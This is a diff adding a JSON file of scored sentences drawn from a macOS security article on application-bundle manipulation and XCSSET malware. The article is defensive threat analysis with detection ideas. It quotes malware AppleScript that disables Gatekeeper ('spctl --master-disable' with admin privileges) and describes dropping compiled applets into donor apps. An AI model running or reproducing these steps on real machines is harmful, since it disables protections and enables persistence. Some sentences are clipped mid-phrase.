+        "sentence": "In the world of macOS, apps are, for all intents and purposes, packaged as application bundles.",
+        "score": 0.4459
+      },
+      {
+        "sentence": "Traditionally, application bundles have been very loosely defined—and one could manipulate them to subvert core macOS security controls.",
+        "score": 0.6049
+      },
+      {
+        "sentence": "In this context, a malicious actor could gain capabilities like privilege escalation and defense evasion.",
+        "score": 0.3159
+      },
+      {
+        "sentence": "In this article, we’ll break down two forms of application bundle manipulation: - trojanizing legitimate application bundles for the purpose of subverting macOS security controls - tampering with a legitimate application bundle on disk for the purpose of defense evasion and/or privilege escalation What kind of apps are being targeted?",
+        "score": 0.6799
+      },
+      {
+        "sentence": "Subversion on this level has the potential to impact one of macOS’s first layers of defense: Gatekeeper.",
+        "score": 0.5493
+      },
+      {
+        "sentence": "In this thread, two developers discuss the inherent inability of macOS to protect their applications against tampering (as of Monterey).",
+        "score": 0.581
+      },
+      {
+        "sentence": "Unfortunately this has led to many developers’ apps being pirated or abused.",
+        "score": 0.3568
+      },
+      {
+        "sentence": "Historically, legitimate apps have been the target of adversaries and software pirates alike.",
+        "score": 0.4531
+      },
+      {
+        "sentence": "Software pirates are individuals who illicitly distribute applications like Microsoft Office, popular games (e.g., Fortnite), and productivity software (e.g, Adobe Photoshop) free of charge and usually over peer-to-peer services.",
+        "score": 0.3762
+      },
+      {
+        "sentence": "Additionally, if a user downloads a pirated application that has also been trojanized, they run the risk of infecting themselves.",
+        "score": 0.5638
+      },
+      {
+        "sentence": "Unfortunately, this is not an uncommon scenario, as seen with the EvilQuest/ThiefQuest, Shlayer and Silver Toucan/UpdateAgent/WizardUpdate malware families (just to name a few), which frequently leverage masquerading tactics to hide their true nature.",
+        "score": 0.401
+      },
+      {
+        "sentence": "Pirated and trojanized applications frequently abuse legitimate application bundles to subvert core macOS security controls.",
+        "score": 0.6187
+      },
+      {
+        "sentence": "However, they do not explicitly exhibit the characteristics of adversarial on-disk application bundle manipulation.",
+        "score": 0.4688
+      },
+      {
+        "sentence": "For that, we’ll need to take a look at a slightly more advanced malware family called XCSSET.",
+        "score": 0.4152
+      },
+      {
+        "sentence": "But first, let’s examine some of macOS’s native security controls.",
+        "score": 0.4783
+      },
+      {
+        "sentence": "Relevant macOS security controls Briefly, some relevant core security controls to mention here are: - System Integrity Protection (SIP) is designed to restrict modification of protected system files and directories from the root user.",
+        "score": 0.5769
+      },
+      {
+        "sentence": "Only entitled macOS processes have the privilege to modify them.",
+        "score": 0.3933
+      },
+      {
+        "sentence": "This is essentially Apple’s in-house version of Security Enhanced Linux (SELinux).",
+        "score": 0.4322
+      },
+      {
+        "sentence": "This is the first of two runtime protection mechanisms enforced by macOS. - Hardened Runtime, the second runtime protection mechanism, helps protect apps against attacks like code injection and memory space tampering.",
+        "score": 0.4389
+      },
+      {
+        "sentence": "This is a capability applied by developers when building their apps. - Codesigning/Notarization determines if an application is who it says it is and has been checked by Apple to be free from malware.",
+        "score": 0.5295
+      },
+      {
+        "sentence": "Note though that these are both independent procedures. - Gatekeeper validates the integrity of notarized application launches (through static analysis, codesigning, etc), protects against tampering, and can launch applications from a randomized path (called Gatekeeper Path Randomization (GPR) / App Translocation) to prevent malicious plugins from loading.",
+        "score": 0.589
+      },
+      {
+        "sentence": "Additionally, in macOS 13, Gatekeeper will also help prevent unauthorized app tampering (see our Gatekeeper overview below). - XProtect comprises YARA signature-based malware detection (and remediation with the advent of XProtect Remediator in macOS 13).",
+        "score": 0.703
+      },
+      {
+        "sentence": "XProtect runs a scan when: - an app is opened for the first time - an app been modified on disk - XProtect signatures have been updated - Transparency, Consent, and Control (TCC) are privacy protections controlling access to things like full disk access, automation, microphone, camera, etc.",
+        "score": 0.6265
+      },
+      {
+        "sentence": "Prior to macOS 13 Ventura, the integrity of applications launched by the user was not always validated.",
+        "score": 0.6491
+      },
+      {
+        "sentence": "In summary, the following checks would occur when a user launched a notarized application for the first time: - Was the app downloaded from the internet?",
+        "score": 0.6271
+      },
+      {
+        "sentence": "If so, a Gatekeeper first launch prompt will be shown and the user will be alerted that the application was downloaded from the internet.",
+        "score": 0.6412
+      },
+      {
+        "sentence": "In practice, this means that macOS has “quarantined” the app.",
+        "score": 0.5887
+      },
+      {
+        "sentence": "Side note: This is an opt-in process for developers.",
+        "score": 0.3451
+      },
+      {
+        "sentence": "In other words, a file downloaded by any given app is only quarantined if the app’s developer has opted into Launch Services File Quarantine Enabled ( LSFileQuarantineEnabled ). - Is the app validly signed?",
+        "score": 0.7306
+      },
+      {
+        "sentence": "This check is done to validate the application is who it says it is and ensure it’s free of tampering. - Is the app safe/free from known malware?",
+        "score": 0.4735
+      },
+      {
+        "sentence": "This check is performed by XProtect YARA scanning. - If so, Gatekeeper will allow the application to launch. - Otherwise, Gatekeeper will block execution of the application only on first launch.",
+        "score": 0.6719
+      },
+      {
+        "sentence": "The crux of the problem here is that app integrity is only being validated on first launch and there are no additional security controls to protect against tampering.",
+        "score": 0.5185
+      },
+      {
+        "sentence": "This means that an adversary could potentially design malware to abuse the gap in application integrity validation, as exhibited by the XCSSET malware family.",
+        "score": 0.3925
+      },
+      {
+        "sentence": "Apple has since addressed this issue by enabling Ventura to deny unauthorized app “updates” and tampering requests.",
+        "score": 0.5201
+      },
+      {
+        "sentence": "This feature was previewed and discussed in the WWDC22 session: What’s new in privacy (see our Gatekeeper overview below).",
+        "score": 0.3584
+      },
+      {
+        "sentence": "Which malware families manipulate application bundles?",
+        "score": 0.5361
+      },
+      {
+        "sentence": "The following malware families manipulate application bundles in some form.",
+        "score": 0.4713
+      },
+      {
+        "sentence": "This is not an exhaustive list: - XCSSET drops a malicious applet into a legitimate app’s (known as the donor) .../Contents/MacOS/ directory.",
+        "score": 0.5508
+      },
+      {
+        "sentence": "This is an explicit case of an adversary leveraging on-disk application bundle manipulation. - Shlayer* has been observed armed with the Gatekeeper bypass: CVE-2021–30657.",
+        "score": 0.5945
+      },
+      {
+        "sentence": "The elegant logic flaw here discovered by Cedric Owens enabled an adversary to bypass Gatekeeper simply by utilizing an executable script in the place of a Mach-O within an application bundle. - EvilQuest / Silver Toucan* are examples of application bundles which have been cracked/modified and can masquerade as popular macOS apps like: Ableton Live, Little Snitch, and MacSnipper.",
+        "score": 0.668
+      },
+      {
+        "sentence": "Silver Toucan has been observed bypassing Gatekeeper. * Please note, the activity observed from these families does not explicitly tie them into our definition of adversarial on-disk application bundle manipulation.",
+        "score": 0.6648
+      },
+      {
+        "sentence": "However, prior to landing on a Mac they come with a modified installer, application bundle, or payload for the purpose of bypassing macOS security controls.",
+        "score": 0.693
+      },
+      {
+        "sentence": "This is somewhat expected behavior of cracked/modified applications like EvilQuest and Silver Toucan.",
+        "score": 0.4059
+      },
+      {
+        "sentence": "Because modern macOS supports a wide array of avenues for code execution, the current security controls in place may have more work on their plates then they previously realized.",
+        "score": 0.4177
+      },
+      {
+        "sentence": "Apps are just one way to get code to execute on macOS; scripts and Java archives can also get the job done.",
+        "score": 0.4652
+      },
+      {
+        "sentence": "Importantly, Apple does not currently notarize all forms of executables.",
+        "score": 0.5749
+      },
+      {
+        "sentence": "Supported deliverables are: apps, (non-app bundles: Frameworks and Loadables), UDIF Disk Images, and Flat installer packages.",
+        "score": 0.4325
+      },
+      {
+        "sentence": "Unlike application bundles and Mach-O executables, security controls such as entitlements, codesigning, and hardened runtime do not apply to shell scripts because they do not make sense in this context.",
+        "score": 0.5462
+      },
+      {
+        "sentence": "Entitlements are only able to be added to executables; this means that the shared libraries, frameworks, and in-process plug-ins inherit all the entitlements of the hosting executable.",
+        "score": 0.4738
+      },
+      {
+        "sentence": "EvilQuest’s authors have been known to run scripts as part of an app install.",
+        "score": 0.4619
+      },
+      {
+        "sentence": "The types of scripts you’re able to run depends on the type of installer package: bundle or flat installer.",
+        "score": 0.389
+      },
+      {
+        "sentence": "This translates to preflight/install and postflight/install scripts.",
+        "score": 0.348
+      },
+      {
+        "sentence": "The Gatekeeper logic flaw we mentioned earlier was enabled by Gatekeeper insufficiently validating the structure and content of the application bundle (appearing with a script executable instead of a more traditional Mach-O binary).",
+        "score": 0.619
+      },
+      {
+        "sentence": "Tricking macOS into executing code within the context of a legitimate app is the name of the game for an adversary here.",
+        "score": 0.4908
+      },
+      {
+        "sentence": "It could enable some nice capabilities: - Defense evasion: The ability of a malicious program to hide its activity.",
+        "score": 0.4415
+      },
+      {
+        "sentence": "In this case, malware like XCSSET latches onto a legitimate donor app. - Privilege escalation: The malicious program gains elevated permissions to, for example, record or capture the screen, steal information from targeted apps, modify software updates, etc.",
+        "score": 0.3906
+      },
+      {
+        "sentence": "What’s the solution? macOS needs a way to ensure that an application is who it says it is, all the time.",
+        "score": 0.4261
+      },
+      {
+        "sentence": "Gatekeeper is one of the core security controls associated with ensuring an application has not been compromised.",
+        "score": 0.3588
+      },
+      {
+        "sentence": "Below we will take a brief look at what Gatekeeper is and the upcoming changes in macOS 13 you should be aware of.",
+        "score": 0.5093
+      },
+      {
+        "sentence": "Gatekeeper A key layer of the macOS security model, Gatekeeper’s job is to only allow trusted application launches.",
+        "score": 0.6899
+      },
+      {
+        "sentence": "It does this on the first launch of notarized apps through validating the requesting app’s cryptographic signature and a notarization ticket, if one exists.",
+        "score": 0.5019
+      },
+      {
+        "sentence": "As mentioned above, developers opt in to the file quarantine policy by by adding the following key to the Info.plist : LSFileQuarantineEnabled Gatekeeper in macOS 13 Excluding the App Store case, prior to macOS 13 Ventura, Gatekeeper only validated the integrity of newly downloaded (i.e., quarantined) apps on first launch.",
+        "score": 0.8103
+      },
+      {
+        "sentence": "However, starting with macOS 13, as explained during WWDC22 session: What’s new in privacy, Gatekeeper will validate the integrity of all notarized apps on first launch (ensuring code signatures stay valid) Previously, Gatekeeper only validated the integrity of notarized apps that had been quarantined on first launch.",
+        "score": 0.7231
+      },
+      {
+        "sentence": "Additionally, Gatekeeper will attempt to block unauthorized tampering attempts alerting the user in the process.",
+        "score": 0.5063
+      },
+      {
+        "sentence": "Modifying an app’s executable, secondary resources, or the Info.plist are all common tasks that app updates might perform if authorized.",
+        "score": 0.4402
+      },
+      {
+        "sentence": "This is a rather elegant solution to the expensive signature validation process that occurs on app first launch.",
+        "score": 0.4891
+      },
+      {
+        "sentence": "By providing the user with the option to allow or deny incoming tampering requests for a given notarized app, the user can effectively prevent their notarized apps from being tampered with.",
+        "score": 0.572
+      },
+      {
+        "sentence": "However, if another development team needs to be able to update that app, they would have to add an NSUpdateSecurityPolicy to the Info.plist and specify the AllowProcesses dictionary that maps a team identifier to a set of signing identifiers.",
+        "score": 0.461
+      },
+      {
+        "sentence": "Image courtesy of developer.apple.com How has on-disk application bundle manipulation been seen in the wild?",
+        "score": 0.4696
+      },
+      {
+        "sentence": "XCSSET achieves defense evasion and privilege escalation by living off of a donor application like Discord or Skype.",
+        "score": 0.4218
+      },
+      {
+        "sentence": "XCSSET accomplishes these goals with help from the Open Scripting Architecture (OSA) that’s baked into macOS.",
+        "score": 0.3974
+      },
+      {
+        "sentence": "Well, for one, Hardened Runtime (which helps protect against code injection and is required for notarization) would need to be disabled and, secondly, a JIT-compilation / “allow unsigned executable memory” entitlement would need to be added.",
+        "score": 0.484
+      },
+      {
+        "sentence": "Again, these requirements are only applicable to apps, disk images, and installers—the deliverables that can be notarized, as noted earlier.",
+        "score": 0.4229
+      },
+      {
+        "sentence": "For example, it’d be useful for Mac administrators to get or set management settings with a script, and this is where the AppleScriptObjC/PyObjC bridges come into play.",
+        "score": 0.3612
+      },
+      {
+        "sentence": "A note on endpoint security - The Endpoint Security Framework (ESF), in its current implementation, does not include any notify events surrounding the Apple Event Manager (e.g., the sending / receiving of Apple Events).",
+        "score": 0.4599
+      },
+      {
+        "sentence": "This means that any endpoint, detection, and response (EDR) sensor that wants to provide visibility into the sending or receiving of Apple Events would need to do so without the help of ESF, a much trickier job. - In Apple’s latest iteration of the ESF, we received a host of new events surrounding login items, authentication, OpenSSH, screen sharing, and XProtect (malware detection and remediation).",
+        "score": 0.5157
+      },
+      {
+        "sentence": "Many of these notify events are useful in detecting the malware we’ve discussed so far.",
+        "score": 0.4235
+      },
+      {
+        "sentence": "XCSSET: a case study We will now walk through how XCSSET, a recent malware family, explicitly demonstrates the concept of on-disk application bundle manipulation.",
+        "score": 0.5435
+      },
+      {
+        "sentence": "In short, XCSSET drops a malicious applet in the donor application’s .../Contents/MacOS/ directory.",
+        "score": 0.5186
+      },
+      {
+        "sentence": "Thus, complexities aside, the malicious applet inherits the privileges associated with the donor application and runs as a seemingly legitimate application.",
+        "score": 0.4965
+      },
+      {
+        "sentence": "Background XCSSET, first reported on in August of 2020 by Trend Micro’s Mac Threat Response team, is an extremely capable macOS malware family primarily targeting developers through malicious Xcode projects (an IDE designed explicitly for Apple platform development).",
+        "score": 0.5223
+      },
+      {
+        "sentence": "Users are infected by XCSSET by downloading and building a compromised Xcode project, which subsequently downloads malicious applets.",
+        "score": 0.6004
+      },
+      {
+        "sentence": "XCSSET contains multiple modules to do things like steal data and includes a replicator component to infect other Xcode projects.",
+        "score": 0.3258
+      },
+      {
+        "sentence": "Applets Applets, for all intents and purposes, are apps.",
+        "score": 0.4736
+      },
+      {
+        "sentence": "Their structure follows the same anatomy as generic application bundles and can be constructed in a few ways: - graphically, with Script Editor.app by selecting the export to application option - graphically, with Automator.app by selecting the application template when creating a new project.",
+        "score": 0.4009
+      },
+      {
+        "sentence": "Automator describes applets as: self-running workflows.",
+        "score": 0.315
+      },
+      {
+        "sentence": "For example, one can make a simple macOS applet which starts the screensaver. - via command line, with osacompile by specifying the[-o] with a.app file extension or[-s] option (for Stay-open applets). - via Foundation Library, using the NSAppleScript API Each of these methods will generate a valid application bundle with a thin Mach-O wrapper for OSA script execution(s).",
+        "score": 0.5297
+      },
+      {
+        "sentence": "However, the Automator option will include a specialty document.wflow file and will name the Mach-O wrapper Automator Application Stub.",
+        "score": 0.3389
+      },
+      {
+        "sentence": "By contrast, the other three options will create a PkgInfo file, keep compiled versions of the scripts in the Resources directory, and will name the Mach-O wrapper applet by default.",
+        "score": 0.4413
+      },
+      {
+        "sentence": "Like regular apps, applets can be launched with the Launch Services API (essentially Finder) and must adhere to all the same Transparency, Consent, and Control (TCC) restrictions.",
+        "score": 0.5696
+      },
+      {
+        "sentence": "In other words, when an applet is launched so isScriptMonitor.app.",
+        "score": 0.4934
+      },
+      {
+        "sentence": "This enables another potential avenue for detection. - By disassembling the binary, we can see that the - If built using Automator, the contents of the OSA script will be placed in the document.wflow file (XML based) under the<key>Action Parameters</key> tag.",
+        "score": 0.4822
+      },
+      {
+        "sentence": "Otherwise, there will be a../Resources/Scripts directory, which will contain all the scripts for the applet - During execution, an osascript command line will generally not be seen in this case, unless theosascript binary is explicitly invoked- Applets can also contain shell scripts used to run OSA code.",
+        "score": 0.4272
+      },
+      {
+        "sentence": "This would be the explicit case in which the osascript binary would be executed, and theosascript command line would be visible, as would theScriptMonitor process - Applets can also contain shell scripts used to run OSA code.",
+        "score": 0.4017
+      },
+      {
+        "sentence": "This would be the explicit case in which the Procedures XCSSET has been observed utilizing the curl and /usr/bin/osacompile command-line tools to download and compile an execute-only AppleScript file (into an applet) respectively.",
+        "score": 0.4389
+      },
+      {
+        "sentence": "XCSSET will then drop the malicious applet at the …/Contents/MacOS/ directory of the donor application.",
+        "score": 0.464
+      },
+      {
+        "sentence": "Legitimate apps targeted by XCSSET as donors have included (shown below in the example from Jamf Threat Labs): Google Chrome, Telegram, Apple Notes, etc.",
+        "score": 0.4086
+      },
+      {
+        "sentence": "The AppleScript code in memory is “execute-only” compiled line by line into an applet and then “dropped” to the location of a temporary application bundle (: Compile After Delivery).",
+        "score": 0.449
+      },
+      {
+        "sentence": "Finally, the applet is copied to the donor application’s …/Contents/MacOS/ directory (: Masquerading and : Compromise Client Software Binary).",
+        "score": 0.4646
+      },
+      {
+        "sentence": "Procedural examples from Jamf Threat Labs and Trend Micro Research Example 1 This excerpt from Jamf Threat Labs was taken from the file screen_sim.applescript and the function verifyCapturePermissions() .",
+        "score": 0.3752
+      },
+      {
+        "sentence": "Here we see AppleScipt code enumerating the different donor applications XCSSET supports via “plugins”/applets.",
+        "score": 0.3683
+      },
+      {
+        "sentence": "Example 2 This excerpt from Jamf Threat Labs was taken from the file screen_sim.applescript and the function createDonorApp() .",
+        "score": 0.3519
+      },
+      {
+        "sentence": "Here we see step one of the primary ties XCSSET has to the application bundle manipulation technique: Creating a fake donor application bundle (and applet) with osacompile -x -e & payload &-o & quoted form of tempApp (: AppleScript, : Compile After Delivery, and : Masquerading).",
+        "score": 0.5031
+      },
+      {
+        "sentence": "Example 3 This excerpt from Jamf Threat Labs was also taken from the file screen_sim.applescript and the function createDonorApp() .",
+        "score": 0.3581
+      },
+      {
+        "sentence": "Here, XCSSET replaces the donor application bundle’s Mach-O with the malicious applet plugin (: AppleScript, : Masquerading, and : Compromise Client Software Binary).",
+        "score": 0.5275
+      },
+      {
+        "sentence": "Example 4 As seen this example from Trend Micro Research, XCSSET is also able to disable software updates and Gatekeeper (: AppleScript and : Impair Defenses: Disable or Modify Tools), which is shown with the following AppleScript: do shell script \"spctl --master-disable\" with administrator privileges Sample XCSSET detection analytics The following pseudo-detectors rely on telemetry from ESF and should help security teams detect XCSSET.",
+        "score": 0.6285
+      },
+      {
+        "sentence": "Detecting on the Xcode build process This analytic uses ES_EVENT_TYPE_NOTIFY_EXEC and ES_EVENT_TYPE_NOTIFY_FORK events.",
+        "score": 0.4472
+      }
+    ]
+  }
+}
